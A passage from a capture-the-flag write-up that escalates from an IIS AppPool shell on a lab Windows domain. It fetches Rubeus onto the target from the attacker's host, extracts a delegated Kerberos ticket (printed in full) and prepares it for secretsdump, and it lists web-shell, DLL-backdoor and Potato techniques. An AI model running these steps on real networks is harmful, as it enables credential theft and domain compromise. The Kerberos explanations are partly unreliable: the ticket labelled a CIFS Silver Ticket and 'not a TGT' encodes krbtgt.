<p>Great! we got shell, but as what user?? the user is <code>iis apppool</code> , what is this user? well obviously its related to the IIS server but lets find more.</p>
<h2 id="shell-as-iis-apppool">Shell as IIS APPPOOL</h2>
<h3 id="what-is-user-iis-apppooldefaultapppool">What is user iis apppool\defaultapppool ?</h3>
<p>According to Microsoft, <code>IIS AppPool\&lt;AppPoolName&gt;</code> is a <strong>service account</strong> created by IIS to run an application pool.</p>
<ul>
<li>Internally, it <strong>can authenticate to other services using the machine account</strong> (<code>DOMAIN\MACHINENAME$</code>) when the app pool accesses network resources — basically, it acts as the computer account on the network.</li>
<li>This is why we can grab a <strong>Kerberos ticket (TGS)</strong> for the machine account if we have code execution (in our case we do have) as the app pool identity, because the app pool is able to request tickets using its machine account delegation/impersonation rights.</li>
</ul>
<p>Furthermore, for future reference i created these bullet points:</p>
<h3 id="attack-vectors-via-apppool-identity"><strong>Attack Vectors via AppPool Identity</strong></h3>
<ol>
<li><strong>Local File System</strong><ul>
<li>Check <code>wwwroot</code> and temp folders for writable paths.</li>
<li>Upload web shells or malicious DLLs if writable.</li>
<li>Look for sensitive configuration files (web.config with credentials).</li>
</ul>
</li>
<li><strong>Local Privilege Escalation</strong><ul>
<li>Misconfigured permissions (folders, registry, services) could allow escalation to SYSTEM.</li>
<li>Exploit <code>SeImpersonatePrivilege</code> if available for token impersonation (e.g., Rubeus, JuicyPotato, RottenPotato).</li>
</ul>
</li>
<li><strong>Network / Machine Account</strong><ul>
<li>AppPool can authenticate as the <strong>machine account</strong> (<code>DOMAIN\MACHINENAME$</code>) on the network.</li>
<li>With code execution, you can:<ul>
<li>Request Kerberos TGS for the machine account (<code>Rubeus</code> → ticket harvesting / overpass-the-hash attacks).</li>
<li>Access network shares or services that trust the machine account.</li>
<li>Pivot laterally to other machines.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Other Web Apps / Services</strong><ul>
<li>If multiple apps share the same pool, compromise may affect all of them.</li>
<li>Look for sensitive app logic or credentials exposed internally.</li>
</ul>
</li>
<li><strong>Persistence</strong><ul>
<li>Upload scheduled tasks, backdoor DLLs, or modify IIS configuration if permissions allow.</li>
</ul>
</li>
</ol>
<h2 id="check-users-privileges">Check user’s privileges</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>whoami<span class="w"> </span>/all
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>----------------------
</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>
</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                               </span><span class="nv">State</span><span class="w">   </span>
</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a><span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span>
</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a>SeAssignPrimaryTokenPrivilege<span class="w"> </span>Replace<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>level<span class="w"> </span>token<span class="w">             </span>Disabled
</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>SeIncreaseQuotaPrivilege<span class="w">      </span>Adjust<span class="w"> </span>memory<span class="w"> </span>quotas<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>process<span class="w">        </span>Disabled
</span><span id="__span-114-8"><a id="__codelineno-114-8" name="__codelineno-114-8" href="#__codelineno-114-8"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">                </span>Disabled
</span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9" href="#__codelineno-114-9"></a>SeAuditPrivilege<span class="w">              </span>Generate<span class="w"> </span>security<span class="w"> </span>audits<span class="w">                  </span>Disabled
</span><span id="__span-114-10"><a id="__codelineno-114-10" name="__codelineno-114-10" href="#__codelineno-114-10"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">                  </span>Enabled<span class="w"> </span>
</span><span id="__span-114-11"><a id="__codelineno-114-11" name="__codelineno-114-11" href="#__codelineno-114-11"></a>SeImpersonatePrivilege<span class="w">        </span>Impersonate<span class="w"> </span>a<span class="w"> </span>client<span class="w"> </span>after<span class="w"> </span>authentication<span class="w"> </span>Enabled<span class="w"> </span>
</span><span id="__span-114-12"><a id="__codelineno-114-12" name="__codelineno-114-12" href="#__codelineno-114-12"></a>SeCreateGlobalPrivilege<span class="w">       </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">                     </span>Enabled<span class="w"> </span>
</span><span id="__span-114-13"><a id="__codelineno-114-13" name="__codelineno-114-13" href="#__codelineno-114-13"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">            </span>Disabled
</span></code></pre></div>
<p>The most interesting one to me here after researching it is the <code>SeImpersonatePrivilege</code> . By the name of it, it indicates impersonating other users/accounts.</p>
<h2 id="what-is-the-privilege-seimpersonate">What is the privilege <strong>SeImpersonate</strong> ?</h2>
<ul>
<li>In Windows, <strong>SeImpersonatePrivilege</strong> is a user right that allows a process to <strong>impersonate the security context of another user</strong> on the same system.</li>
<li>A process with this privilege can take another user’s token (session) and execute actions <strong>as if it were that user</strong>.</li>
<li>This is commonly used for services that need to act on behalf of a logged-in user, but in pentesting it can be abused for <strong>privilege escalation or ticket requests</strong>.</li>
</ul>
<h3 id="so-in-our-case">So in our case:</h3>
<ul>
<li><strong>DefaultAppPool</strong> is a service account running on the host.</li>
<li>On Windows, many services running as <strong>SYSTEM or AppPool accounts</strong> have <strong>SeImpersonatePrivilege</strong> by default.</li>
<li>This means a process running as DefaultAppPool can <strong>impersonate other accounts on the machine</strong>, including the machine account itself (<code>MACHINE$</code>).</li>
</ul>
<h3 id="what-impersonating-the-machine-account-locally-means">What impersonating the MACHINE$ account locally means</h3>
<ol>
<li>DefaultAppPool runs Rubeus.</li>
<li>Rubeus uses <strong>SeImpersonatePrivilege</strong> to grab the <strong>token of the MACHINE$ account</strong> on the local host. (the token contains also creds for the user)</li>
<li>While impersonating MACHINE$, Rubeus can request Kerberos tickets from the DC <strong>as if it were MACHINE$</strong>.</li>
<li>The KDC trusts the request and issues a <strong>legitimate Silver Ticket</strong> for a service on the host.</li>
</ol>
<h3 id="why-this-works-without-the-machine-account-password">Why this works without the machine account password</h3>
<ul>
<li>Normally, to forge a Silver Ticket, you need the <strong>NTLM hash of MACHINE$</strong>.</li>
<li>Here, because DefaultAppPool can impersonate MACHINE$, the ticket is <strong>issued legitimately by the DC</strong>, so no password or hash is required.</li>
<li>This is a <strong>local privilege escalation combined with Kerberos ticket request</strong>, a common attack path in Active Directory pentesting.</li>
</ul>
<h3 id="why-not-impersonate-administrator-directly">Why not impersonate Administrator directly?</h3>
<p>Even though <strong>DefaultAppPool has some privileges</strong>, it <strong>cannot directly impersonate the Administrator account</strong> unless certain conditions are met. Let me break it down carefully:</p>
<h3 id="1-seimpersonateprivilege-vs-actual-tokens">1️⃣ SeImpersonatePrivilege vs. actual tokens</h3>
<ul>
<li><strong>SeImpersonatePrivilege</strong> allows a process to <strong>impersonate tokens that already exist</strong> on the machine.</li>
<li>The key is: the token must be <strong>active/logged-on or present in memory</strong>.</li>
<li><strong>DefaultAppPool</strong> usually runs under a service account and can see <strong>some local system or machine account tokens</strong>, but it <strong>cannot arbitrarily create or access Administrator tokens</strong> unless an Administrator is currently logged in or has a process running that the AppPool can grab.</li>
</ul>
<h3 id="2-why-machine-works">2️⃣ Why MACHINE$ works</h3>
<ul>
<li>MACHINE$ always has a <strong>token available locally</strong>, because the machine account is the identity of the host in the domain.</li>
<li>Windows automatically creates and maintains the MACHINE$ token for local operations and Kerberos authentication.</li>
<li>DefaultAppPool can <strong>impersonate MACHINE$</strong> because that token exists and the AppPool has SeImpersonatePrivilege.</li>
</ul>
<h3 id="3-why-administrator-is-harder">3️⃣ Why Administrator is harder</h3>
<ul>
<li>Administrator tokens exist only when someone is logged in or when a process runs as Administrator.</li>
<li>On most servers, <strong>Administrator is not actively logged in</strong>, and DefaultAppPool cannot spawn one.</li>
<li>Without an Administrator token to grab, SeImpersonatePrivilege <strong>cannot be used to impersonate it directly</strong>.</li>
</ul>
<h3 id="4-practical-implications">4️⃣ Practical implications</h3>
<ul>
<li>By impersonating MACHINE$, you can <strong>legitimately request a Silver Ticket</strong> from the KDC.</li>
<li>That ticket inherits <strong>high privileges on the host</strong>, including access to LSASS, which allows you to dump <strong>Administrator hashes</strong> anyway.</li>
<li>This is why you <strong>don’t need to impersonate Administrator directly</strong> — MACHINE$ is enough to escalate or extract secrets.</li>
</ul>
<hr />
<p>💡 <strong>Summary:</strong></p>
<blockquote>
<p>DefaultAppPool cannot directly impersonate Administrator because the Administrator token isn’t readily available. MACHINE$ works because its token always exists locally, and impersonating it allows you to act with very high privileges anyway.<br />
</p>
</blockquote>
<h2 id="grabbing-machine-accounts-ticket-with-rubeus">Grabbing machine account’s ticket with Rubeus</h2>
<p>Start locally a python server, then retrieve the file on the target host:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>powershell<span class="w"> </span>-c<span class="w"> </span>wget<span class="w"> </span><span class="m">10</span>.10.14.180:800/Rubeus.exe<span class="w"> </span>-outfile<span class="w"> </span>Rubeus.exe
</span></code></pre></div>
<p>run rubeus</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>tgtdeleg<span class="w"> </span>/nowrap
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="w">   </span>______<span class="w">        </span>_<span class="w">                      </span>
</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a><span class="w">  </span><span class="o">(</span>_____<span class="w"> </span><span class="se">\ </span><span class="w">     </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">                     </span>
</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a><span class="w">   </span>_____<span class="o">)</span><span class="w"> </span><span class="o">)</span>_<span class="w">   </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="w">  </span>_____<span class="w"> </span>_<span class="w">   </span>_<span class="w">  </span>___<span class="w"> </span>
</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#__codelineno-117-4"></a><span class="w">  </span><span class="p">|</span><span class="w">  </span>__<span class="w">  </span>/<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span>___<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>/___<span class="o">)</span>
</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#__codelineno-117-5"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="se">\ \|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>____<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>___<span class="w"> </span><span class="p">|</span>
</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6" href="#__codelineno-117-6"></a><span class="w">  </span><span class="p">|</span>_<span class="p">|</span><span class="w">   </span><span class="p">|</span>_<span class="p">|</span>____/<span class="p">|</span>____/<span class="p">|</span>_____<span class="o">)</span>____/<span class="o">(</span>___/
</span><span id="__span-117-7"><a id="__codelineno-117-7" name="__codelineno-117-7" href="#__codelineno-117-7"></a>
</span><span id="__span-117-8"><a id="__codelineno-117-8" name="__codelineno-117-8" href="#__codelineno-117-8"></a><span class="w">  </span>v2.2.0<span class="w"> </span>
</span><span id="__span-117-9"><a id="__codelineno-117-9" name="__codelineno-117-9" href="#__codelineno-117-9"></a>
</span><span id="__span-117-10"><a id="__codelineno-117-10" name="__codelineno-117-10" href="#__codelineno-117-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Action:<span class="w"> </span>Request<span class="w"> </span>Fake<span class="w"> </span>Delegation<span class="w"> </span>TGT<span class="w"> </span><span class="o">(</span>current<span class="w"> </span>user<span class="o">)</span>
</span><span id="__span-117-11"><a id="__codelineno-117-11" name="__codelineno-117-11" href="#__codelineno-117-11"></a>
</span><span id="__span-117-12"><a id="__codelineno-117-12" name="__codelineno-117-12" href="#__codelineno-117-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>target<span class="w"> </span>SPN<span class="w"> </span>specified,<span class="w"> </span>attempting<span class="w"> </span>to<span class="w"> </span>build<span class="w"> </span><span class="s1">&#39;cifs/dc.domain.com&#39;</span>
</span><span id="__span-117-13"><a id="__codelineno-117-13" name="__codelineno-117-13" href="#__codelineno-117-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Initializing<span class="w"> </span>Kerberos<span class="w"> </span>GSS-API<span class="w"> </span>w/<span class="w"> </span>fake<span class="w"> </span>delegation<span class="w"> </span><span class="k">for</span><span class="w"> </span>target<span class="w"> </span><span class="s1">&#39;cifs/g0.flight.htb&#39;</span>
</span><span id="__span-117-14"><a id="__codelineno-117-14" name="__codelineno-117-14" href="#__codelineno-117-14"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Kerberos<span class="w"> </span>GSS-API<span class="w"> </span>initialization<span class="w"> </span>success!
</span><span id="__span-117-15"><a id="__codelineno-117-15" name="__codelineno-117-15" href="#__codelineno-117-15"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Delegation<span class="w"> </span>requset<span class="w"> </span>success!<span class="w"> </span>AP-REQ<span class="w"> </span>delegation<span class="w"> </span>ticket<span class="w"> </span>is<span class="w"> </span>now<span class="w"> </span><span class="k">in</span><span class="w"> </span>GSS-API<span class="w"> </span>output.
</span><span id="__span-117-16"><a id="__codelineno-117-16" name="__codelineno-117-16" href="#__codelineno-117-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>the<span class="w"> </span>AP-REQ<span class="w"> </span>delegation<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>GSS-API<span class="w"> </span>output.
</span><span id="__span-117-17"><a id="__codelineno-117-17" name="__codelineno-117-17" href="#__codelineno-117-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Authenticator<span class="w"> </span>etype:<span class="w"> </span>aes256_cts_hmac_sha1
</span><span id="__span-117-18"><a id="__codelineno-117-18" name="__codelineno-117-18" href="#__codelineno-117-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Extracted<span class="w"> </span>the<span class="w"> </span>service<span class="w"> </span>ticket<span class="w"> </span>session<span class="w"> </span>key<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>ticket<span class="w"> </span>cache:<span class="w"> </span>eAztthc+aOmkBoZUMiSKVWE2CqzSYvcKM/APadCdlZg<span class="o">=</span>
</span><span id="__span-117-19"><a id="__codelineno-117-19" name="__codelineno-117-19" href="#__codelineno-117-19"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>decrypted<span class="w"> </span>the<span class="w"> </span>authenticator
</span><span id="__span-117-20"><a id="__codelineno-117-20" name="__codelineno-117-20" href="#__codelineno-117-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>base64<span class="o">(</span>ticket.kirbi<span class="o">)</span>:
</span><span id="__span-117-21"><a id="__codelineno-117-21" name="__codelineno-117-21" href="#__codelineno-117-21"></a>
</span><span id="__span-117-22"><a id="__codelineno-117-22" name="__codelineno-117-22" href="#__codelineno-117-22"></a><span class="w">      </span>doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECq5ljBkW9O5BYWEDIS2OmwVeoGZbkfugbE8pBTvgbXsfYf/riYBd75znb0xTK1eweKz2CFVFe24AXZUjz6hYNsEHjSM6OxHdI04wIYfZvgcPVdL5xfgmZ11og6ULW9wLA9JiL1S4E5pWIl/CoEjc2TMFlO66KW+4JYqGv148W2KFWcvd+m/GJlwCPmohcX8m+KAWTwmI8Gw2rYZ3gAc7AXVWw6GC1h2ssGIlmg9z/5jP0XX4smSU9HIr7rhtcZDxOJ+y3+Yu8vl5HQHvZi6wV8K7RLi/s8rYXXkWJ4Pc5s1QAYIGKUAp6m4jQUQ1vQbRm7bASYY7R+W5WUqerJxmbtkF3xnTwW/s48gqeFKyRb6DDAnYX66TAXhN70xdPcTGAgaLrwK4FGXPR5xKRjIU20Lgp+Tl/oa8BCEccR+DzIKCAiSQSef13Y/wuTJQ1dC5BBiSXMShVE+2RVst6wp168IoIoWBx6OD8yKANzJOAFX9W1Ieuky3xK3fywFK4GTxSvSLPGFB8U8JHe6IhZmlWJeFWmryF0AiqVc7CkmjY63WG3R/uZz9JDE5KZ88cecfu2ODlOHHNM9WwD8UZc6YpYkxGKQOuEH89SqVbxACo3VfsgmasLqSsD6CaO/gxsK3umwbjlKTfCmfZ4ld78HtpNFKjhMI224lfqIJKK3Iv2pmCGfGOgEjxDN1hD6NAxUe7nhomiDmA0VBKdS8lsrM+kT7nbMUzvMaMNDuMdtjh+1K0f6vkJ+lApJsuHIZ/nW/e3MRTMbsfNx7PqVJilIsA39684m+RwltsZCZDWFn+6tsSXI9D5D3hcSh8EXqRRKJhD5Ia+1mC7v8ZIgFnJEIys5CNs59mapk7kXjY4nFJ2f0ofYZuk1YrV8x30Wb/6p+PnA0a1UV4UcRcAxUpXBptJCUkgMs07E5ybN7aAJ5FwR1lqvQpP7f2AhRgEHBnTrX7jMCtz2OMC1KYcPiGxudBL3JQZqo0FRAT7HGwlvwe+Q7M36sRIIOZX1HujXkUURlXZMO/yivEuD/5c3+f2X4zCQSy9My8sDWrZdK7TNt3QkXWDfOy+2/IXXpFRfcpccz7EH7dTMPIuZ1AzYRX07LjK4MJ/PTl4AnD37tN7iu6mF4Z4V0QBRNCK1cZ7e8I+/whgh+Ral83HHAB8h8W/sVGB4K9cW0Kl/3l2cRO7uJq/FUVSudRJr3jfp0srmDK9ujno0nRVueON/4R0/CQRQgTGP7U9Y6zVMgRT2FM24CtMuqiBBiL0YOQcQAOvD+/VOhbr3xChRQzQScp2Jte6/gWoqzfmsQlxvPe6yzMMlR6tGNIK4bOKPKc/e9PVLemQGZgIYBRX2+N/Nte+c4TZvp2uB+gqIyYohWoVvIo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgZ+NhRRlTt9s9gM7xQtaF9eHGA5iwrVQK+UeMbarvoimhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MDgyNDAwMjUxN1qmERgPMjAyNTA4MjQxMDI1MTdapxEYDzIwMjUwODMxMDAyNTE3WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
</span></code></pre></div>
<p>We obtained Silver Ticket for the <code>machine account</code>. </p>
<p>What Rubeus did here?</p>
<ul>
<li><strong>Action:</strong> <code>Request Fake Delegation TGT (current user)</code><ul>
<li>This means Rubeus is creating a <strong>delegation ticket</strong> for the current account.</li>
<li>A “fake delegation TGT” is essentially a <strong>TGS-for-a-service with delegation rights</strong>, not a full TGT for the domain.</li>
</ul>
</li>
<li><strong>Target SPN:</strong> <code>cifs/g0.flight.htb</code><ul>
<li>It automatically tried to get a ticket for the <strong>CIFS service</strong> on the host <code>g0.flight.htb</code>.</li>
</ul>
</li>
<li><strong>Result:</strong> <code>AP-REQ delegation ticket is now in GSS-API output</code><ul>
<li>An <strong>AP-REQ</strong> is a Kerberos request that uses a service ticket (TGS) to authenticate to a service.</li>
<li>The ticket you now have is a <strong>service ticket for CIFS</strong> (i.e., a <strong>Silver Ticket</strong> in practice).</li>
</ul>
</li>
<li><code>Found the AP-REQ delegation ticket in the GSS-API output.</code><ul>
<li>This confirms you now have a <strong>delegation-capable TGS</strong> for the target service.</li>
<li>It’s <strong>not a TGT</strong>; it’s limited to the service you requested.</li>
</ul>
</li>
</ul>
<p>This is essentially a <strong>Silver Ticket</strong>. It allows you to authenticate to the target host’s service (CIFS) using the machine account’s privileges </p>
<p>Silver Ticket recap</p>
<ul>
<li>A <strong>Silver Ticket</strong> is a <strong>Kerberos service ticket (TGS) for a specific service on a host</strong>, forged or obtained using the service account’s secret (here: machine account).</li>
<li>Scope is limited to that service/host.</li>
<li>You can use it to authenticate to the host/service <strong>without going to the Domain Controller again</strong>.</li>
</ul>
<p>So our ticket:</p>
<ul>
<li>Is a <strong>service ticket for <code>cifs/g0.flight.htb</code></strong>, signed with the machine account’s key.</li>
<li>Works like a <strong>Silver Ticket</strong>, because it’s host/service-specific.</li>
</ul>
<p>Here is a graphical representation of what Rubeus did:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image22.png" /></p>
<p>mermaid:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>sequenceDiagram
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a><span class="w">    </span>participant<span class="w"> </span>AppPool<span class="w"> </span>as<span class="w"> </span>DefaultAppPool<span class="w"> </span><span class="o">(</span>compromised<span class="o">)</span>
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a><span class="w">    </span>participant<span class="w"> </span>Rubeus
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a><span class="w">    </span>participant<span class="w"> </span>Machine<span class="w"> </span>as<span class="w"> </span>MACHINE$<span class="w"> </span><span class="o">(</span>Machine<span class="w"> </span>Account<span class="o">)</span>
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a><span class="w">    </span>participant<span class="w"> </span>Target<span class="w"> </span>as<span class="w"> </span>Host<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>CIFS/g0.flight.htb<span class="o">)</span>
</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#__codelineno-118-6"></a>
</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7" href="#__codelineno-118-7"></a><span class="w">    </span>Note<span class="w"> </span>over<span class="w"> </span>AppPool:<span class="w"> </span>Rubeus<span class="w"> </span>is<span class="w"> </span>run<span class="w"> </span>under<span class="w"> </span>DefaultAppPool<span class="w"> </span>account
</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8" href="#__codelineno-118-8"></a>
</span><span id="__span-118-9"><a id="__codelineno-118-9" name="__codelineno-118-9" href="#__codelineno-118-9"></a><span class="w">    </span>%%<span class="w"> </span>AppPool<span class="w"> </span>uses<span class="w"> </span>MACHINE$<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>a<span class="w"> </span>service<span class="w"> </span>ticket
</span><span id="__span-118-10"><a id="__codelineno-118-10" name="__codelineno-118-10" href="#__codelineno-118-10"></a><span class="w">    </span>AppPool-&gt;&gt;Rubeus:<span class="w"> </span>Run<span class="w"> </span>Rubeus<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>TGS<span class="w"> </span><span class="k">for</span><span class="w"> </span>CIFS/g0.flight.htb
</span><span id="__span-118-11"><a id="__codelineno-118-11" name="__codelineno-118-11" href="#__codelineno-118-11"></a><span class="w">    </span>Rubeus-&gt;&gt;Machine:<span class="w"> </span>Uses<span class="w"> </span>MACHINE$<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span>build<span class="w"> </span>TGS<span class="w"> </span>request
</span><span id="__span-118-12"><a id="__codelineno-118-12" name="__codelineno-118-12" href="#__codelineno-118-12"></a><span class="w">    </span>Machine--&gt;&gt;Rubeus:<span class="w"> </span>Provides<span class="w"> </span>AP-REQ<span class="w"> </span>delegation<span class="w"> </span>ticket<span class="w"> </span><span class="o">(</span>Silver<span class="w"> </span>Ticket<span class="o">)</span>
</span><span id="__span-118-13"><a id="__codelineno-118-13" name="__codelineno-118-13" href="#__codelineno-118-13"></a><span class="w">    </span>Rubeus-&gt;&gt;AppPool:<span class="w"> </span>Returns<span class="w"> </span>Silver<span class="w"> </span>Ticket<span class="w"> </span><span class="k">for</span><span class="w"> </span>use
</span><span id="__span-118-14"><a id="__codelineno-118-14" name="__codelineno-118-14" href="#__codelineno-118-14"></a>
</span><span id="__span-118-15"><a id="__codelineno-118-15" name="__codelineno-118-15" href="#__codelineno-118-15"></a><span class="w">    </span>%%<span class="w"> </span>Target<span class="w"> </span>receives<span class="w"> </span>the<span class="w"> </span>service<span class="w"> </span>ticket
</span><span id="__span-118-16"><a id="__codelineno-118-16" name="__codelineno-118-16" href="#__codelineno-118-16"></a><span class="w">    </span>AppPool-&gt;&gt;Target:<span class="w"> </span>Presents<span class="w"> </span>Silver<span class="w"> </span>Ticket<span class="w"> </span>to<span class="w"> </span>authenticate<span class="w"> </span>as<span class="w"> </span>MACHINE$
</span><span id="__span-118-17"><a id="__codelineno-118-17" name="__codelineno-118-17" href="#__codelineno-118-17"></a><span class="w">    </span>Target--&gt;&gt;AppPool:<span class="w"> </span>Grants<span class="w"> </span>access<span class="w"> </span>according<span class="w"> </span>to<span class="w"> </span>MACHINE$<span class="w"> </span>privileges
</span></code></pre></div>
<p>What does access to this account mean? what can we do with this type of account?</p>
<h3 id="what-are-machine-accounts-accounts">What are Machine accounts (<code>$</code> accounts)</h3>
<ul>
<li>Every computer joined to an Active Directory domain has a machine account, e.g., <code>MACHINE$</code>.</li>
<li>Machine accounts are <strong>essentially treated as highly privileged on their own host</strong>:<ul>
<li>They can authenticate as the computer itself.</li>
<li>They usually have <strong>local admin rights</strong> on their own machine.</li>
<li>They are <strong>trusted by the domain</strong> for certain actions, including DCSync-like operations if the host is allowed.</li>
</ul>
</li>
</ul>
<p>We will procced to converting it from Base64 to Kirbi format</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>cat<span class="w"> </span>flight_ticket.b64<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>ticket.kirbi
</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>python<span class="w"> </span>kirbi2ccache.py<span class="w"> </span>ticket.kirbi<span class="w"> </span>ticket.ccache
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>INFO:root:Parsing<span class="w"> </span>kirbi<span class="w"> </span>file<span class="w"> </span>/home/ch3ckm8/my_data/flight_ticket.kirbi
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>INFO:root:Done!
</span></code></pre></div>
<p>it worked, next lets sync with the domain:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span>flight.htb
</span></code></pre></div>
<p>Then tell Kerberos to use the file <code>ticket.ccache</code> to store and read our authentication tickets instead of the default cache:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ticket.ccache
</span></code></pre></div>
<p>Also modify etc/hosts like this to include the domain (g0) too: (secretsdump failed without it xd, i should have added it on the recon phase)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="m">10</span>.129.146.179<span class="w"> </span>school.flight.htb<span class="w"> </span>flight.htb<span class="w"> </span>g0.flight.htb
</span></code></pre></div>
